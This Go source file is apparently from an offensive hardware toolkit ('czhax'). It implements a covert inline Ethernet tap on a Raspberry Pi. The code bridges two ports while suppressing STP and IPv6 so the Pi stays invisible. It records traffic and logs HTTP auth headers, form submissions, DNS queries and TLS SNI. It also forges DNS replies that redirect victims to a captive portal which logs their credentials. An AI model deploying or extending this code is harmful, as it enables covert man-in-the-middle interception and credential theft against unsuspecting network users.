// Package ethtap turns the Pi into a transparent inline Ethernet tap.
//
// Two wired ports are enslaved to a Linux bridge, so frames are forwarded
// unchanged: TTLs, MAC addresses and addresses stay exactly as they were and
// the tapped device has no way to tell the Pi is in the path. While bridging,
// the tap records traffic, learns hosts and protocols, and can optionally
// answer DNS queries with a forged A record pointing at a local captive portal
// (credentials are logged the same way as the evil-twin portal).
package ethtap

import (
	"context"
	"errors"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/czhax/czhax/internal/wifi"
)

// DefaultBridge is the interface name used for the tap.
const DefaultBridge = "cztap0"

// Usage is the headless helper usage line.
const Usage = "usage: czhax local tap --port-a eth0 --port-b eth1 [--record] [--spoof --subnet 192.168.1.0/24] [--portal login|custom] [--portal-ip 192.168.1.250]"

// Config describes one tap run.
type Config struct {
	PortA  string `json:"port_a"`
	PortB  string `json:"port_b"`
	Bridge string `json:"bridge,omitempty"`

	Record     bool   `json:"record"`
	CaptureDir string `json:"capture_dir,omitempty"`

	// Spoof answers DNS with PortalIP so clients land on the portal.
	Spoof     bool   `json:"spoof,omitempty"`
	PortalIP  string `json:"portal_ip,omitempty"` // empty = pick a free address
	Subnet    string `json:"subnet,omitempty"`    // CIDR used to pick PortalIP
	Portal    string `json:"portal,omitempty"`    // off|login|custom
	PortalDoc string `json:"portal_file,omitempty"`
	PortalLog string `json:"portal_log,omitempty"`

	WorkDir string `json:"work_dir,omitempty"`
	UID     int    `json:"uid,omitempty"`
	GID     int    `json:"gid,omitempty"`
}

// Run sets up the tap and blocks until ctx is cancelled, tearing everything
// down again. It needs root (a bridge plus an AF_PACKET socket).
func Run(ctx context.Context, cfg Config, onLine func(string)) error {
	w := &lineWriter{emit: onLine}
	return run(ctx, cfg, w)
}

type lineWriter struct {
	mu    sync.Mutex
	emit  func(string)
	log   *os.File
	limit *eventLimiter
}

func (w *lineWriter) line(format string, args ...any) {
	msg := fmt.Sprintf(format, args...)
	w.mu.Lock()
	defer w.mu.Unlock()
	if w.emit != nil {
		w.emit(msg)
	}
	if w.log != nil {
		fmt.Fprintf(w.log, "%s %s\n", time.Now().Format("2006-01-02 15:04:05"), msg)
	}
}

func (w *lineWriter) close() {
	if w.log != nil {
		_ = w.log.Close()
		w.log = nil
	}
}

func run(ctx context.Context, cfg Config, out *lineWriter) error {
	if os.Geteuid() != 0 {
		return errors.New("needs root (sudo czhax local tap ...)")
	}
	a := strings.TrimSpace(cfg.PortA)
	b := strings.TrimSpace(cfg.PortB)
	if a == "" || b == "" {
		return errors.New("pick two Ethernet ports")
	}
	if a == b {
		return errors.New("the two ports must be different")
	}
	bridge := strings.TrimSpace(cfg.Bridge)
	if bridge == "" {
		bridge = DefaultBridge
	}
	if a == bridge || b == bridge {
		return errors.New("a port cannot be the bridge itself")
	}
	for _, name := range []string{a, b} {
		if err := checkEtherPort(name); err != nil {
			return err
		}
	}
	if _, err := exec.LookPath("ip"); err != nil && !fileExists("/usr/sbin/ip") && !fileExists("/sbin/ip") {
		return errors.New("the ip command is missing (install iproute2)")
	}

	captureDir := strings.TrimSpace(cfg.CaptureDir)
	if captureDir == "" {
		captureDir = filepath.Join(os.TempDir(), "czhax-tap")
	}
	if err := os.MkdirAll(captureDir, 0o700); err != nil {
		return err
	}
	workDir := strings.TrimSpace(cfg.WorkDir)
	if workDir == "" {
		workDir = os.TempDir()
	}

	stamp := time.Now().Format("20060102_150405")
	if cfg.Record {
		logPath := filepath.Join(captureDir, "tap-"+stamp+".log")
		if f, err := os.OpenFile(logPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600); err == nil {
			chown(f.Name(), cfg.UID, cfg.GID)
			out.log = f
		}
	}

	// Everything created below is undone in reverse order on both success and
	// failure paths, so a crashed run never leaves the ports enslaved.
	var undo []func()
	defer func() {
		// The cleanup must run even though ctx is already cancelled (that is
		// precisely when it runs on a normal stop).
		ctx = context.WithoutCancel(ctx)
		for i := len(undo) - 1; i >= 0; i-- {
			undo[i]()
		}
		out.close()
	}()

	cleanStaleBridge(ctx, bridge, a, b, out)

	if out := runTool(ctx, "ip", "link", "add", "name", bridge, "type", "bridge"); out != nil {
		return fmt.Errorf("create %s: %s", bridge, *out)
	}
	undo = append(undo, func() { _ = runTool(ctx, "ip", "link", "del", bridge) })
	// No STP: the segment is a straight point-to-point cut, so forwarding must
	// start instantly and the bridge must stay silent (no BPDUs).
	_ = runTool(ctx, "ip", "link", "set", "dev", bridge, "type", "bridge", "stp_state", "0", "forward_delay", "0")
	_ = runTool(ctx, "ip", "link", "set", "dev", bridge, "type", "bridge", "multicast_snooping", "0")
	// The Pi must not talk IPv6 on the tapped segment (link-local DAD/MLD would
	// reveal an extra host). Bridged client traffic is unaffected.
	writeSysctl(filepath.Join("/proc/sys/net/ipv6/conf", bridge, "disable_ipv6"), "1")

	if out := runTool(ctx, "ip", "link", "set", "dev", bridge, "up"); out != nil {
		return fmt.Errorf("bring up %s: %s", bridge, *out)
	}

	// A host firewall commonly sets FORWARD DROP and br_netfilter then drops
	// every bridged frame, which would silently blackhole the tap. Turn the
	// bridge hooks off for the run and restore them on stop.
	restoreNetfilter := disableBridgeNetfilter(out)
	undo = append(undo, restoreNetfilter)

	for _, port := range []string{a, b} {
		setNetworkManagerManaged(ctx, port, false)
		if out := runTool(ctx, "ip", "link", "set", "dev", port, "master", bridge); out != nil {
			return fmt.Errorf("enslave %s: %s", port, *out)
		}
		if out := runTool(ctx, "ip", "link", "set", "dev", port, "up"); out != nil {
			return fmt.Errorf("bring up %s: %s", port, *out)
		}
	}
	undo = append(undo, func() {
		for _, port := range []string{a, b} {
			_ = runTool(ctx, "ip", "link", "set", "dev", port, "nomaster")
			_ = runTool(ctx, "ip", "link", "set", "dev", port, "up")
			setNetworkManagerManaged(ctx, port, true)
		}
	})

	link, err := openTapSocket(bridge)
	if err != nil {
		return fmt.Errorf("capture socket on %s: %w (needs root)", bridge, err)
	}
	defer link.close()

	// A tap in the path carries the device's uplink, so losing the Pi's own
	// connectivity is expected; say so instead of failing later.
	for _, port := range []string{a, b} {
		if defaultRouteIface() == port {
			out.line("note: %s carries the Pi's default route - the Pi loses its own uplink while tapped", port)
		}
	}

	out.line("tap %s: %s <-> %s (bridge, transparent L2)", bridge, a, b)
	for _, port := range []string{a, b} {
		if !carrierUp(port) {
			out.line("warning: %s has no carrier yet - plug the link or wait for the device", port)
		}
	}

	if cfg.Spoof {
		ip, prefix, perr := ensurePortalIP(ctx, cfg, bridge, []string{a, b}, link, out)
		if perr != nil {
			return perr
		}
		out.line("portal %s/%d (dns spoof on)", ip, prefix)
		stop, serr := startPortal(cfg, ip, out)
		if serr != nil {
			return serr
		}
		defer stop()
		cfg.PortalIP = ip.String()
	}

	var cap *pcapWriter
	if cfg.Record {
		path := filepath.Join(captureDir, "tap-"+stamp+".pcap")
		cap, err = newPcapWriter(path)
		if err != nil {
			return fmt.Errorf("record: %w", err)
		}
		defer func() {
			_ = cap.close()
			chown(path, cfg.UID, cfg.GID)
			if st, serr := os.Stat(path); serr == nil {
				out.line("capture %s (%s)", filepath.Base(path), humanBytes(st.Size()))
			}
		}()
		out.line("capture %s", filepath.Base(path))
	}

	out.limit = newEventLimiter(3 * time.Second)
	return captureLoop(ctx, link, out, cap, cfg)
}

// captureLoop is the single-threaded capture/report loop: one reader, no
// locks, so the CM0 spends its cycles on frames rather than coordination.
func captureLoop(ctx context.Context, link *packetSocket, out *lineWriter, cap *pcapWriter, cfg Config) error {
	buf := make([]byte, 65536)
	stats := newStatsTracker()
	limit := out.limit
	portalIP := net.ParseIP(cfg.PortalIP).To4()
	spoof := cfg.Spoof && portalIP != nil

	report := time.NewTicker(time.Second)
	defer report.Stop()
	lastTop := ""
	topTick := 0
	start := time.Now()

	for {
		select {
		case <-ctx.Done():
			s := stats.snapshot()
			out.line("tap stopped after %s: %s", time.Since(start).Round(time.Second), s.Summary())
			return ctx.Err()
		case <-report.C:
			if cap != nil {
				cap.flush()
			}
			s := stats.snapshot()
			out.line("%s", s.Line())
			out.line("%s", s.ProtoLine())
			topTick++
			if s.Top != "" && (s.Top != lastTop || topTick%5 == 0) {
				lastTop = s.Top
				out.line("top %s", s.Top)
			}
			continue
		default:
		}

		n, outgoing, err := link.readFrame(buf, 200*time.Millisecond)
		if err != nil {
			if err == errPacketTimeout {
				continue
			}
			if ctx.Err() != nil {
				continue
			}
			return err
		}
		if outgoing || n < 14 {
			continue
		}
		frame := buf[:n]
		pkt, ok := Dissect(frame)
		if !ok {
			continue
		}
		now := time.Now()
		stats.add(pkt, n)
		if cap != nil {
			_ = cap.write(frame, now)
		}
		reportPacket(pkt, out)

		if !spoof || pkt.DNSName == "" || pkt.DstPort != 53 {
			continue
		}
		payload, name, forged := BuildDNSSpoof(pkt.Payload, portalIP, 30)
		if !forged {
			continue
		}
		reply, ferr := DNSReplyFrame(pkt, payload)
		if ferr != nil {
			continue
		}
		if werr := link.write(reply); werr != nil {
			if limit.allow("write-error") {
				out.line("spoof write failed: %v", werr)
			}
			continue
		}
		if limit.allow("spoof:" + name) {
			out.line("spoof %s -> %s", name, portalIP)
		}
	}
}

func reportPacket(pkt Packet, out *lineWriter) {
	switch {
	case pkt.HTTPMethod != "":
		if pkt.HTTPAuth != "" && out.limit.allow("auth:"+pkt.HTTPAuth) {
			out.line("auth %s %s", pkt.SrcIP, pkt.HTTPAuth)
		}
		if pkt.HTTPForm != "" && out.limit.allow("form:"+pkt.HTTPForm) {
			out.line("form %s %s", pkt.SrcIP, pkt.HTTPForm)
		}
		target := pkt.HTTPHost + pkt.HTTPPath
		if target == "" {
			target = pkt.HTTPPath
		}
		if out.limit.allow("http:" + pkt.SrcIP.String() + target) {
			out.line("http %s %s %s", pkt.SrcIP, pkt.HTTPMethod, target)
		}
	case pkt.DNSName != "":
		if out.limit.allow("dns:" + pkt.DNSName) {
			out.line("dns %s asks %s", pkt.SrcIP, pkt.DNSName)
		}
	case pkt.SNI != "":
		if out.limit.allow("tls:" + pkt.SNI) {
			out.line("tls %s %s", pkt.SrcIP, pkt.SNI)
		}
	}
}

// ensurePortalIP returns the address the bridge should own for the portal.
func ensurePortalIP(ctx context.Context, cfg Config, bridge string, ports []string, link *packetSocket, out *lineWriter) (net.IP, int, error) {
	if raw := strings.TrimSpace(cfg.PortalIP); raw != "" && !strings.EqualFold(raw, "auto") {
		ip := net.ParseIP(raw).To4()
		if ip == nil {
			return nil, 0, fmt.Errorf("invalid portal IP %q", raw)
		}
		prefix := 24
		if _, _, perr := net.ParseCIDR(cfg.Subnet); perr == nil {
			prefix = subnetPrefix(cfg.Subnet)
		}
		if err := addBridgeAddr(ctx, bridge, ip, prefix); err != nil {
			return nil, 0, err
		}
		return ip, prefix, nil
	}
	subnet := strings.TrimSpace(cfg.Subnet)
	if subnet == "" {
		return nil, 0, errors.New("no IPv4 on either port: set a portal IP or a subnet")
	}
	if _, _, err := net.ParseCIDR(subnet); err != nil {
		return nil, 0, fmt.Errorf("bad subnet %q", subnet)
	}
	prefix := subnetPrefix(subnet)
	excluded := map[string]bool{}
	for _, port := range ports {
		if inf, err := net.InterfaceByName(port); err == nil {
			for _, a := range mustAddrs(inf) {
				if ipnet, ok := a.(*net.IPNet); ok {
					excluded[ipnet.IP.String()] = true
				}
			}
		}
	}
	candidates := portalCandidates(subnet, 8)
	if len(candidates) == 0 {
		return nil, 0, fmt.Errorf("subnet %s has no free host address", subnet)
	}
	for _, ip := range candidates {
		if excluded[ip.String()] {
			continue
		}
		if arpProbe(link, ip, 250*time.Millisecond) {
			continue
		}
		if err := addBridgeAddr(ctx, bridge, ip, prefix); err != nil {
			continue
		}
		return ip, prefix, nil
	}
	return nil, 0, fmt.Errorf("no free address in %s - set a portal IP explicitly", subnet)
}

func addBridgeAddr(ctx context.Context, bridge string, ip net.IP, prefix int) error {
	if id, err := net.InterfaceByName(bridge); err == nil {
		for _, a := range mustAddrs(id) {
			if ipnet, ok := a.(*net.IPNet); ok && ipnet.IP.Equal(ip) {
				return nil // already ours
			}
		}
	}
	if out := runTool(ctx, "ip", "addr", "add", fmt.Sprintf("%s/%d", ip, prefix), "dev", bridge); out != nil {
		if strings.Contains(*out, "File exists") {
			return nil
		}
		return fmt.Errorf("address %s: %s", ip, *out)
	}
	return nil
}

// startPortal serves the captive portal on the bridge address port 80.
func startPortal(cfg Config, ip net.IP, out *lineWriter) (func(), error) {
	mode := wifi.ParsePortalMode(cfg.Portal)
	if mode == wifi.PortalOff {
		mode = wifi.PortalLogin
	}
	logPath := strings.TrimSpace(cfg.PortalLog)
	if logPath == "" {
		logPath = filepath.Join(cfg.CaptureDir, "tap-"+time.Now().Format("20060102_150405")+".ndjson")
	}
	if f, err := os.OpenFile(logPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600); err == nil {
		_ = f.Close()
		chown(logPath, cfg.UID, cfg.GID)
	}
	handler := wifi.NewPortalHandler(wifi.PortalConfig{
		Mode:    mode,
		File:    cfg.PortalDoc,
		LogPath: logPath,
		OnEvent: func(s string) { out.line("%s", s) },
	})
	srv := &http.Server{Handler: handler, ReadHeaderTimeout: 5 * time.Second}
	ln, err := net.Listen("tcp", net.JoinHostPort(ip.String(), "80"))
	if err != nil {
		return nil, fmt.Errorf("portal on %s:80: %w (port in use?)", ip, err)
	}
	go func() { _ = srv.Serve(ln) }()
	out.line("portal page %s, credentials -> %s", mode, filepath.Base(logPath))
	return func() {
		_ = srv.Close()
		_ = ln.Close()
	}, nil
}

// arpProbe asks the segment who holds ip and reports whether anybody answered.
func arpProbe(link *packetSocket, ip net.IP, timeout time.Duration) bool {
	frame := arpRequestFrame(link.mac, ip, ip)
	if frame == nil {
		return false
	}
	if err := link.write(frame); err != nil {
		return false
	}
	buf := make([]byte, 2048)
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		n, outgoing, err := link.readFrame(buf, 50*time.Millisecond)
		if err != nil || outgoing {
			continue
		}
		if sender, ok := parseARPReply(buf[:n]); ok && sender.Equal(ip) {
			return true
		}
	}
	return false
}

// portalCandidates lists usable host addresses from the top of the subnet down,
// which keeps the portal away from DHCP pools and common gateway addresses.
func portalCandidates(cidr string, max int) []net.IP {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil
	}
	base := ipnet.IP.To4()
	if base == nil {
		return nil
	}
	ones, bits := ipnet.Mask.Size()
	if bits != 32 || ones > 30 {
		return nil
	}
	start := uint32(base[0])<<24 | uint32(base[1])<<16 | uint32(base[2])<<8 | uint32(base[3])
	size := uint32(1) << (32 - ones)
	last := start + size - 2 // broadcast - 1
	var out []net.IP
	for i := uint32(0); i < uint32(max) && last-i > start; i++ {
		v := last - i
		out = append(out, net.IPv4(byte(v>>24), byte(v>>16), byte(v>>8), byte(v)))
	}
	return out
}

func subnetPrefix(cidr string) int {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return 24
	}
	ones, _ := ipnet.Mask.Size()
	return ones
}

// --- plumbing ---------------------------------------------------------------

func checkEtherPort(name string) error {
	if name == "lo" || strings.HasPrefix(name, "tailscale") || strings.HasPrefix(name, "docker") {
		return fmt.Errorf("%s is not a tapped Ethernet port", name)
	}
	if _, err := net.InterfaceByName(name); err != nil {
		return fmt.Errorf("interface %s: %w", name, err)
	}
	ifaceDir := filepath.Join("/sys/class/net", name)
	if t, err := os.ReadFile(filepath.Join(ifaceDir, "type")); err == nil {
		// ARPHRD_ETHER == 1; USB tethering often reports NONE (65534) and has no
		// Ethernet header, so a bridge cannot use it.
		if strings.TrimSpace(string(t)) != "1" {
			return fmt.Errorf("%s is not an Ethernet device (type %s); use a real eth/usb lan adapter", name, strings.TrimSpace(string(t)))
		}
	}
	if _, err := os.Stat(filepath.Join(ifaceDir, "wireless")); err == nil {
		return fmt.Errorf("%s is WiFi - a bridge needs the two Ethernet ports", name)
	}
	if _, err := os.Stat(filepath.Join(ifaceDir, "phy80211")); err == nil {
		return fmt.Errorf("%s is WiFi - a bridge needs the two Ethernet ports", name)
	}
	return nil
}

// cleanStaleBridge removes a bridge left behind by a killed run. Only the
// configured name is touched, and only when both ports are already its members
// (so we never delete a bridge the user made for something else).
func cleanStaleBridge(ctx context.Context, bridge, a, b string, out *lineWriter) {
	if _, err := net.InterfaceByName(bridge); err != nil {
		return
	}
	members := bridgeMembers(bridge)
	// A run that died mid-setup may have only enslaved one port, or none at all
	// (still our own default name). Anything else is left alone.
	stale := members[a] || members[b] || (bridge == DefaultBridge && len(members) == 0)
	if stale {
		_ = runTool(ctx, "ip", "link", "del", bridge)
		out.line("cleaned stale bridge %s", bridge)
	}
}

func bridgeMembers(bridge string) map[string]bool {
	out := map[string]bool{}
	entries, err := os.ReadDir(filepath.Join("/sys/class/net", bridge, "brif"))
	if err != nil {
		return out
	}
	for _, e := range entries {
		out[e.Name()] = true
	}
	return out
}

func defaultRouteIface() string {
	raw, err := os.ReadFile("/proc/net/route")
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(raw), "\n")[1:] {
		fields := strings.Fields(line)
		if len(fields) < 2 || fields[1] != "00000000" {
			continue
		}
		return fields[0]
	}
	return ""
}

func carrierUp(name string) bool {
	raw, err := os.ReadFile(filepath.Join("/sys/class/net", name, "carrier"))
	if err != nil {
		return false
	}
	return strings.TrimSpace(string(raw)) == "1"
}

func setNetworkManagerManaged(ctx context.Context, iface string, managed bool) {
	if _, err := exec.LookPath("nmcli"); err != nil {
		return
	}
	state := "yes"
	if !managed {
		state = "no"
	}
	_ = runTool(ctx, "nmcli", "device", "set", iface, "managed", state)
}

func runTool(ctx context.Context, name string, args ...string) *string {
	bin := resolveBin(name)
	c := exec.CommandContext(ctx, bin, args...)
	raw, err := c.CombinedOutput()
	text := strings.TrimSpace(string(raw))
	if err != nil {
		if text == "" {
			text = err.Error()
		}
		return &text
	}
	return nil
}

func resolveBin(name string) string {
	if p, err := exec.LookPath(name); err == nil {
		return p
	}
	for _, dir := range []string{"/sbin", "/usr/sbin", "/usr/bin", "/bin"} {
		cand := filepath.Join(dir, name)
		if st, err := os.Stat(cand); err == nil && !st.IsDir() {
			return cand
		}
	}
	return name
}

func writeSysctl(path, value string) {
	_ = os.WriteFile(path, []byte(value), 0o644)
}

func chown(path string, uid, gid int) {
	if uid > 0 || gid > 0 {
		_ = os.Chown(path, uid, gid)
	}
}

func mustAddrs(inf *net.Interface) []net.Addr {
	addrs, err := inf.Addrs()
	if err != nil {
		return nil
	}
	return addrs
}

func fileExists(path string) bool {
	st, err := os.Stat(path)
	return err == nil && !st.IsDir()
}

// eventLimiter collapses repeated log lines (DNS floods are common) so the UI
// and the log file stay readable.
type eventLimiter struct {
	window time.Duration
	seen   map[string]time.Time
}

func newEventLimiter(window time.Duration) *eventLimiter {
	return &eventLimiter{window: window, seen: make(map[string]time.Time, 64)}
}

func (l *eventLimiter) allow(key string) bool {
	if l == nil {
		return true
	}
	now := time.Now()
	if t, ok := l.seen[key]; ok && now.Sub(t) < l.window {
		return false
	}
	if len(l.seen) > 512 {
		for k := range l.seen {
			delete(l.seen, k)
		}
	}
	l.seen[key] = now
	return true
}

// disableBridgeNetfilter stops the br_netfilter hooks from sending bridged
// frames through iptables. Without it, a host firewall with `FORWARD DROP`
// (Docker, ufw, many distro defaults) blackholes the tap: the bridge forwards
// nothing and the link simply dies. The previous values are restored on stop.
func disableBridgeNetfilter(out *lineWriter) func() {
	paths := []string{
		"/proc/sys/net/bridge/bridge-nf-call-iptables",
		"/proc/sys/net/bridge/bridge-nf-call-ip6tables",
		"/proc/sys/net/bridge/bridge-nf-call-arptables",
	}
	saved := map[string]string{}
	for _, path := range paths {
		raw, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		value := strings.TrimSpace(string(raw))
		if value == "0" {
			continue
		}
		saved[path] = value
		if err := os.WriteFile(path, []byte("0"), 0o644); err != nil {
			delete(saved, path)
		}
	}
	if len(saved) > 0 && out != nil {
		out.line("bridge netfilter hooks off (FORWARD DROP would blackhole the tap)")
	}
	return func() {
		for path, value := range saved {
			_ = os.WriteFile(path, []byte(value), 0o644)
		}
	}
}
